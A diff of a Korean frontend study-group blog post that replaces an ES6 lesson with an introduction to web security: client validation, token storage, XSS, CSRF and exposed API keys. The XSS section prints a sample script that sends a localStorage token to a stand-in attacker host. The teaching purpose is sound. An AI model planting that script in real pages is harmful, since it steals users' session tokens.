@@ -1,371 +1,169 @@
 ---
-title: "프론트엔드 스터디 대면 9주차: React 입문 전 브릿지 — ES6+ 문법과 에러 처리"
-date: 2026-05-23
+title: "프론트엔드 스터디 대면 9주차: 웹 보안 — 브라우저에 있는 코드는 믿으면 안 된다"
+date: 2026-05-25
 tags:
   - 프론트엔드
   - 스터디
-  - JavaScript
-  - ES6
-  - 구조분해할당
-  - 에러처리
-description: 클로저와 비동기 복습을 코드 중심으로 다시 짚고, React에서 매일 사용하는 ES6+ 문법과 에러 처리 관련 면접 질문을 다룹니다. JS에서 React로 넘어가는 브릿지 주차입니다.
+  - 웹 보안
+  - XSS
+  - CSRF
+  - 토큰
+  - 인증
+  - AI 보안
+description: React 전 필수 JS 문법을 비대면에서 배운 뒤, 대면에서는 브라우저 코드의 한계와 웹 보안 감각을 다룹니다. 클라이언트 검증, 토큰 저장, XSS, CSRF, API 키 노출과 AI 생성 코드의 위험을 봅니다.
 ---
 
-<Subtitle level={2}>1. 저번 주 복습 — 클로저와 비동기</Subtitle>
+<Subtitle level={2}>1. 왜 보안을 지금 이야기하는가</Subtitle>
 
 <Paragraph>
-  지난주에는 클로저, Promise, async/await를 배웠습니다. React에서 가장 많이
-  쓰이는 JS 개념이기도 합니다. 코드 예시와 비유 중심으로 다시 짚어보겠습니다.
+  이제 곧 React로 화면을 더 빠르게 만들 수 있게 됩니다. 그런데 화면을 잘 만드는
+  것과 안전한 서비스를 만드는 것은 다릅니다. 특히 프론트엔드는 사용자의 브라우저
+  위에서 실행됩니다. 이 말은 곧{" "}
+  <strong>사용자가 프론트엔드 코드를 볼 수 있고, 일부는 조작할 수 있다</strong>
+  는 뜻입니다.
 </Paragraph>
 
-<Subtitle level={3}>클로저(Closure) — "함수가 기억하는 배낭"</Subtitle>
+<Paragraph>오늘의 핵심 문장은 하나입니다.</Paragraph>
 
 <Paragraph>
-  클로저를 비유하면, 함수가 태어날 때 주변 변수를{" "}
-  <strong>배낭에 담아가는 것</strong>
-  입니다. 함수가 어디서 실행되든, 태어났을 때 담아간 배낭(렉시컬 환경)은 그대로
-  들고 다닙니다.
-</Paragraph>
-
-```js
-function makeGreeting(greeting) {
-  // greeting이 배낭에 담김
-  return function (name) {
-    // 이 함수가 어디서 실행되든 greeting을 기억
-    return `${greeting}, ${name}!`;
-  };
-}
-
-const hello = makeGreeting("안녕하세요"); // greeting = "안녕하세요" 담김
-const bye = makeGreeting("잘 가요"); // greeting = "잘 가요" 담김
-
-hello("철수"); // "안녕하세요, 철수!"
-bye("영희"); // "잘 가요, 영희!"
-```
-
-<Paragraph>
-  <strong>React에서의 클로저</strong>: `useState`의 상태값, 이벤트 핸들러 안의
-  변수가 모두 클로저로 동작합니다. 나중에 React를 배우면 이 개념이 바로
-  연결됩니다.
-</Paragraph>
-
-```js
-// React에서 클로저가 쓰이는 패턴 (미리보기)
-function Counter() {
-  const [count, setCount] = useState(0);
-
-  const handleClick = () => {
-    // handleClick은 count를 클로저로 기억
-    setCount(count + 1);
-  };
-
-  return <button onClick={handleClick}>{count}</button>;
-}
-```
-
-<Subtitle level={3}>비동기 처리 — "주문하고 번호표 받기"</Subtitle>
-
-<Paragraph>
-  비동기를 비유하면 <strong>카페에서 주문하는 것</strong>과 같습니다.
-  주문(요청)을 넣고 번호표(Promise)를 받습니다. 음료가 나올 때까지 다른 일을
-  하다가, 번호가 불리면(fulfilled) 음료를 받습니다. 만약 재료가 없으면(rejected)
-  "죄송합니다"라는 답을 받습니다.
-</Paragraph>
-
-```js
-// Promise = 번호표
-const order = fetch("/api/coffee"); // 주문 접수 → 번호표(Promise) 반환
-
-// async/await = 번호표를 들고 기다리기
-async function getCoffee() {
-  try {
-    const response = await fetch("/api/coffee"); // 기다림
-    const data = await response.json(); // 음료 수령
-    return data;
-  } catch (err) {
-    console.error("주문 실패:", err); // 재료 없음
-  }
-}
-```
-
-<Subtitle level={3}>이벤트 루프 — 실행 순서 퀴즈</Subtitle>
-
-<Paragraph>
-  아래 코드의 실행 순서를 맞춰보세요.{" "}
-  <strong>콜 스택 → 마이크로태스크(Promise) → 매크로태스크(setTimeout)</strong>{" "}
-  순서를 기억하면 됩니다.
-</Paragraph>
-
-```js
-console.log("1"); // 콜 스택 — 즉시 실행
-
-setTimeout(() => console.log("2"), 0); // 매크로태스크 큐
-
-Promise.resolve().then(() => console.log("3")); // 마이크로태스크 큐
-
-console.log("4"); // 콜 스택 — 즉시 실행
-
-// 출력 순서: 1, 4, 3, 2
-```
-
----
-
-<Subtitle level={2}>2. 저번 주 과제 정답 및 풀이</Subtitle>
-
-<Subtitle level={3}>인증 미션 과제</Subtitle>
-
-<Paragraph>
-  <strong>
-    Q1. React의 `useState`는 왜 객체가 아닌 배열을 반환할까요? 배열 구조 분해로
-    받으면 어떤 점이 편리한지 설명해보세요.
-  </strong>
-</Paragraph>
-
-<Subtitle level={4}>정답</Subtitle>
-
-<Paragraph>
-  배열 구조 분해는 <strong>변수 이름을 자유롭게 지정</strong>할 수 있기
-  때문입니다. 객체 구조 분해는 프로퍼티 이름이 고정되어 있어 여러 `useState`를
-  사용할 때 이름 충돌이 발생합니다.
-</Paragraph>
-
-<Paragraph>
-  `const [count, setCount] = useState(0)`처럼 원하는 이름을 바로 붙일 수
-  있습니다. 만약 객체였다면 `const {"{"} state: count, setState: setCount {"}"}{" "}
-  = useState(0)`처럼 매번 이름을 변경해야 합니다.
+  <strong>브라우저에 있는 코드는 믿으면 안 됩니다.</strong>
 </Paragraph>
 
 ---
 
-<Paragraph>
-  <strong>
-    Q2. `setState(prev ={">"} ({"{"} ...prev, count: prev.count + 1 {"}"}))`
-    패턴에서 스프레드(`...`)를 사용하는 이유를 설명해보세요. 스프레드 없이 `
-    {"{"} count: prev.count + 1 {"}"}`만 쓰면 어떤 문제가 생길까요?
-  </strong>
-</Paragraph>
-
-<Subtitle level={4}>정답</Subtitle>
-
-<Paragraph>
-  스프레드를 사용하면{" "}
-  <strong>
-    기존 상태의 모든 프로퍼티를 유지하면서 특정 프로퍼티만 덮어쓸 수 있습니다.
-  </strong>{" "}
-  스프레드 없이 쓰면 나머지 프로퍼티가 모두 사라집니다.
-</Paragraph>
-
-<Paragraph>
-  예를 들어 상태가 `{"{"} name: '철수', count: 0 {"}"}`일 때 `{"{"} count: 1{" "}
-  {"}"}`만 쓰면 `name`이 사라져 `{"{"} count: 1 {"}"}`만 남습니다. React에서는
-  상태를 직접 수정(mutation)하지 않고 새 객체를 만드는{" "}
-  <strong>불변 업데이트</strong>를 원칙으로 합니다.
-</Paragraph>
-
----
-
-<Paragraph>
-  <strong>
-    Q3. `user?.address?.city`와 `user && user.address && user.address.city`의
-    동작이 완전히 같을까요? 차이가 있다면 어떤 경우에 다르게 동작하는지
-    설명하세요.
-  </strong>
-</Paragraph>
-
-<Subtitle level={4}>
-  정답: `user`가 `0`이나 `''`처럼 falsy 값일 때 다르게 동작합니다.
+<Subtitle level={2}>
+  2. 클라이언트 검증은 UX용이지 보안의 최종선이 아니다
 </Subtitle>
 
 <Paragraph>
-  `&&`는 왼쪽이 falsy이면 그 값을 반환합니다. `user`가 `0`이면 `0 &&
-  0.address`는 `0`을 반환합니다. 하지만 `0?.address`는 `undefined`를 반환합니다.{" "}
-  <strong>`?.`는 오직 `null`과 `undefined`만 체크</strong>하기 때문입니다.
+  회원가입 폼에서 비밀번호 길이를 검사하거나, 숫자만 입력하게 막는 코드는 사용자
+  경험을 좋게 만듭니다. 하지만 이것만으로 보안이 지켜지는 것은 아닙니다.
 </Paragraph>
-
----
-
-<Paragraph>
-  <strong>
-    Q4. React 프로젝트에서 named export와 default export를 각각 어떤 상황에
-    사용하는지, 실제 프로젝트 관례를 기준으로 설명해보세요.
-  </strong>
-</Paragraph>
-
-<Subtitle level={4}>정답</Subtitle>
-
-- <strong>default export</strong>: React 컴포넌트 — 파일당 하나가 원칙이므로
-  자연스럽습니다.
-- <strong>named export</strong>: 유틸 함수, 상수, 타입 — 한 파일에 여러 개를
-  모아두므로 named export를 사용합니다.
-
-<Paragraph>
-  named export는 import 시 자동완성이 잘 되고, 오타를 에디터가 잡아주는 장점도
-  있습니다.
-</Paragraph>
-
----
-
-<Subtitle level={2}>3. 면접 질문</Subtitle>
-
-<Paragraph>
-  이번 주는 React로 넘어가기 전 마지막 JS 면접 질문입니다. ES6+ 문법은 React에서
-  매일 사용하므로, 자신만의 말로 설명하는 연습을 해보세요.
-</Paragraph>
-
-<Subtitle level={3}>
-  Q1. map과 filter의 차이는 무엇이고, 언제 사용하나요?
-</Subtitle>
-
-<Paragraph>
-  둘 다 원본 배열을 변경하지 않고 <strong>새 배열을 반환</strong>하는 순수
-  함수입니다.
-</Paragraph>
-
-- <strong>`map`</strong>: 각 요소를 <strong>변환</strong>하여 같은 길이의 새
-  배열을 반환. "모든 요소에 같은 작업 적용"
-- <strong>`filter`</strong>: 조건에 맞는 요소만 <strong>걸러내서</strong> 더
-  짧거나 같은 길이의 새 배열을 반환. "조건에 맞는 것만 선택"
 
 ```js
-const numbers = [1, 2, 3, 4, 5];
-
-// map — 변환: 모든 요소를 2배로
-numbers.map((n) => n * 2); // [2, 4, 6, 8, 10]
-
-// filter — 필터링: 짝수만 선택
-numbers.filter((n) => n % 2 === 0); // [2, 4]
-
-// 체이닝: filter 먼저 → map
-// 짝수만 골라서(2개) 2배 하기 vs 전체(5개) 2배 후 짝수 고르기
-numbers.filter((n) => n % 2 === 0).map((n) => n * 2); // [4, 8]
-```
-
-<Paragraph>
-  면접 팁: "React에서 `map`은 리스트 렌더링에, `filter`는 조건부 필터링에 매일
-  사용합니다. 체이닝할 때 `filter`를 먼저 하면 처리할 요소 수가 줄어들어 더
-  효율적입니다"라고 연결하면 좋습니다.
-</Paragraph>
-
-<Subtitle level={3}>Q2. 구조 분해 할당이 React에서 어떻게 쓰이나요?</Subtitle>
-
-<Paragraph>
-  구조 분해 할당은{" "}
-  <strong>배열이나 객체의 값을 개별 변수로 한 번에 추출</strong>하는 문법입니다.
-  React에서는 두 가지 핵심 패턴에 사용됩니다.
-</Paragraph>
-
-```jsx
-// 1. props 수신 — 객체 구조 분해
-function UserCard({ name, age, role = "user" }) {
-  return (
-    <div>
-      {name} ({age}) - {role}
-    </div>
-  );
+if (password.length < 8) {
+  alert("비밀번호는 8자 이상이어야 합니다.");
 }
-
-// 2. useState — 배열 구조 분해
-const [count, setCount] = useState(0);
-// useState가 [현재값, 변경함수] 배열을 반환하고,
-// 구조 분해로 각각 변수에 할당
-
-// 3. API 응답에서 필요한 값만 추출
-const { data, error, isLoading } = useSWR("/api/user");
 ```
 
 <Paragraph>
-  면접 팁: "기본값 지정(`role = 'user'`), 이름 변경(`data: userData`), Rest
-  파라미터(`{ name, ...others }`)까지 알고 있으면 코드가 훨씬 간결해집니다"라고
-  답하면 좋습니다.
+  사용자는 브라우저 개발자 도구나 직접 만든 요청으로 이 코드를 우회할 수
+  있습니다. 그래서 중요한 검증은 반드시 서버에서도 해야 합니다. 프론트엔드
+  검증은 사용자를 도와주는 장치이고, 서버 검증은 시스템을 지키는 장치입니다.
 </Paragraph>
 
-<Subtitle level={3}>
-  Q3. 옵셔널 체이닝(?.)과 null 병합 연산자(??)를 설명해주세요. ||와 ??의 차이는?
+---
+
+<Subtitle level={2}>
+  3. 실제 사례 — AI로 만든 웹 게임을 QA하다가 생긴 일
 </Subtitle>
 
 <Paragraph>
-  <strong>옵셔널 체이닝(`?.`)</strong>: 앞의 값이 `null`이나 `undefined`이면
-  에러 없이 `undefined`를 반환합니다. 중첩 객체에 안전하게 접근할 때 사용합니다.
-</Paragraph>
-
-<Paragraph>
-  <strong>null 병합 연산자(`??`)</strong>: 왼쪽이 `null` 또는 `undefined`일 때만
-  오른쪽 값을 반환합니다.
+  이전에 친구가 AI로 웹 게임을 만들어 온 적이 있습니다. 겉으로 보기에는 잘
+  동작했습니다. 버튼을 누르면 게임이 진행되고, 점수가 오르고, 랭킹도 보였습니다.
+  그런데 브라우저 개발자 도구를 열어보니 내부 함수와 상태가 너무 쉽게 노출되어
+  있었습니다.
 </Paragraph>
 
 ```js
-const user = null;
-
-// 옵셔널 체이닝 — TypeError 방지
-user?.address?.city; // undefined (에러 없음)
-
-// ?. + ?? 조합 — 안전한 접근 + 기본값
-user?.profile?.avatar ?? "/default.png"; // "/default.png"
-
-// ?? vs || — 핵심 차이
-const count = 0;
-count || "기본값"; // "기본값" — 0은 falsy라서 오른쪽 반환
-count ?? "기본값"; // 0 — 0은 null/undefined가 아니므로 왼쪽 유지
-
-const name = "";
-name || "익명"; // "익명" — 빈 문자열은 falsy
-name ?? "익명"; // "" — 빈 문자열은 null/undefined가 아님
+// 게임 내부 함수가 전역에 노출되어 있었다
+applyLaser(anyRegion, anyRegion); // 1회 호출에 점수 +38
 ```
 
 <Paragraph>
-  면접 팁: "`||`는 0, 빈 문자열, false도 falsy로 처리합니다. 수량이나 금액처럼
-  0이 유효한 값인 경우 `??`를 써야 의도치 않게 기본값으로 바뀌지 않습니다"라고
-  설명하면 실무 감각이 있다는 인상을 줍니다.
+  원래라면 레이저 아이템을 실제로 가지고 있는지, 사용 가능한 상황인지 서버나
+  신뢰할 수 있는 로직에서 검증해야 합니다. 하지만 이 게임은 콘솔에서 함수를
+  호출하면 점수가 올라갔습니다. AI는 "돌아가는 게임"은 만들어줬지만, "나쁜
+  사용자가 어떻게 조작할 수 있는가"까지 먼저 챙겨주지는 않았습니다.
+</Paragraph>
+
+<Paragraph>
+  이 사례는 AI 시대에 더 중요합니다. AI가 만든 앱은 빠르게 그럴듯해집니다.
+  하지만 잘 돌아가는 것처럼 보인다고 안전한 것은 아닙니다.
 </Paragraph>
 
 ---
 
-<Subtitle level={2}>4. 관련 포스팅</Subtitle>
+<Subtitle level={2}>4. 토큰 저장 — localStorage vs Cookie</Subtitle>
 
-- <Anchor href="/blog/study/clab-26-1/week9">
-    프론트엔드 스터디 9주차 학습 자료: 클로저, Promise, async/await
-  </Anchor>
-- <Anchor href="/blog/study/clab-26-1/week10">
-    프론트엔드 스터디 10주차 학습 자료: ES6+ 문법과 에러 처리
-  </Anchor>
+<Paragraph>
+  로그인 기능을 만들면 토큰을 어디에 저장할지 고민하게 됩니다. 대표적으로
+  localStorage와 cookie가 있습니다. 둘 다 장단점이 있습니다.
+</Paragraph>
+
+- <strong>localStorage</strong>: 사용하기 쉽지만 JavaScript로 접근 가능해서
+  XSS에 취약합니다.
+- <strong>httpOnly Cookie</strong>: JavaScript에서 직접 읽을 수 없어 XSS에
+  상대적으로 강하지만, CSRF 대응과 SameSite 설정을 함께 봐야 합니다.
+
+<Paragraph>
+  결론은 "무조건 이게 정답"이 아니라, 어떤 공격을 막아야 하고 서비스 구조가
+  어떤지 보고 선택해야 한다는 것입니다. 중요한 건 토큰이 곧 권한이라는
+  감각입니다.
+</Paragraph>
 
 ---
 
-<Subtitle level={2}>5. 다음 주 안내</Subtitle>
+<Subtitle level={2}>
+  5. XSS — 남의 스크립트가 내 사이트에서 실행되는 문제
+</Subtitle>
 
 <Paragraph>
-  다음 주부터 드디어 <strong>React</strong>를 시작합니다! 지금까지 배운 JS
-  개념들 — 클로저, 비동기, 구조 분해, map/filter, 옵셔널 체이닝 — 이 React에서
-  어떻게 활용되는지 바로 체감할 수 있을 것입니다.
+  XSS는 공격자가 넣은 스크립트가 우리 사이트에서 실행되는 문제입니다. 예를 들어
+  게시글 내용에 스크립트를 넣었는데, 다른 사용자가 그 게시글을 볼 때 실행된다면
+  큰 문제가 됩니다.
+</Paragraph>
+
+```html
+<script>
+  fetch("https://attacker.com?token=" + localStorage.getItem("token"));
+</script>
+```
+
+<Paragraph>
+  React는 기본적으로 문자열을 escape해주기 때문에 많은 XSS를 막아줍니다. 하지만
+  `dangerouslySetInnerHTML`처럼 HTML을 직접 넣는 기능을 쓰거나, 외부
+  markdown/html을 렌더링할 때는 조심해야 합니다.
+</Paragraph>
+
+---
+
+<Subtitle level={2}>
+  6. CSRF — 사용자가 원하지 않은 요청이 전송되는 문제
+</Subtitle>
+
+<Paragraph>
+  CSRF는 사용자가 로그인된 상태를 이용해, 사용자가 의도하지 않은 요청을 보내게
+  만드는 공격입니다. 쿠키 기반 인증에서는 브라우저가 쿠키를 자동으로 붙여 보내기
+  때문에 특히 신경 써야 합니다.
 </Paragraph>
 
 <Paragraph>
-  React는 <strong>컴포넌트</strong>라는 작은 UI 조각을 조합해서 화면을 만드는
-  라이브러리입니다. HTML을 JS 안에 쓰는 <strong>JSX</strong> 문법, 부모에서
-  자식으로 데이터를 전달하는 <strong>props</strong>, 컴포넌트가 자신의 값을
-  기억하는 <strong>useState</strong> 같은 개념을 배우게 됩니다. JS를 이미 알고
-  있으니 생각보다 빠르게 적응할 수 있습니다.
+  SameSite Cookie, CSRF Token, Origin/Referer 검증 같은 대응이 있습니다. 오늘
+  전부 외울 필요는 없습니다. 핵심은 "브라우저가 자동으로 인증 정보를 붙여 보내는
+  구조에서는 이런 공격이 가능하다"는 감각입니다.
 </Paragraph>
 
-<Subtitle level={3}>다음 주 예습</Subtitle>
+---
+
+<Subtitle level={2}>7. API 키를 프론트에 넣으면 안 되는 이유</Subtitle>
 
 <Paragraph>
-  아래 챕터를 순서대로 읽어오세요. 코드 예제는 직접 따라 작성해보는 것을
-  권장합니다.
+  프론트엔드 번들에 들어간 값은 결국 사용자에게 전달됩니다. `.env`에 넣었다고
+  안전한 것이 아닙니다. 빌드 시점에 클라이언트 코드로 들어간 API 키는
+  브라우저에서 확인될 수 있습니다.
 </Paragraph>
 
-- <Anchor external="https://reactjs.winterlood.com/8c7c4423-01d2-4abc-9616-e95298522778">
-    컴포넌트
-  </Anchor>
-- <Anchor external="https://reactjs.winterlood.com/d60d9a2c-18ed-4488-9dc9-09a0cd205998">
-    JSX
-  </Anchor>
-- <Anchor external="https://reactjs.winterlood.com/c89cba30-39b6-4094-85f6-f87a16842028">
-    컴포넌트에 값 전달하기 (Props)
-  </Anchor>
-- <Anchor external="https://reactjs.winterlood.com/f5477777-a3f2-4fe2-8a80-4bb6142c679b">
-    이벤트 처리하기
-  </Anchor>
-- <Anchor external="https://reactjs.winterlood.com/c167aa87-b661-4d35-9bc3-2a5e5434d4ac">
-    컴포넌트와 상태 (useState)
-  </Anchor>
+<Paragraph>
+  외부 서비스 키나 숨겨야 할 토큰은 서버, BFF, 서버리스 함수 같은 신뢰할 수 있는
+  계층에서 다뤄야 합니다.
+</Paragraph>
+
+---
+
+<Subtitle level={2}>8. 다음 주 안내</Subtitle>
+
+<Paragraph>
+  다음 대면에서는 팀 협업을 다룹니다. Git, PR, 컨벤션, 리뷰 문화처럼 혼자 공부할
+  때는 잘 와닿지 않지만 팀 프로젝트에서 바로 필요한 것들을 봅니다.
+</Paragraph>
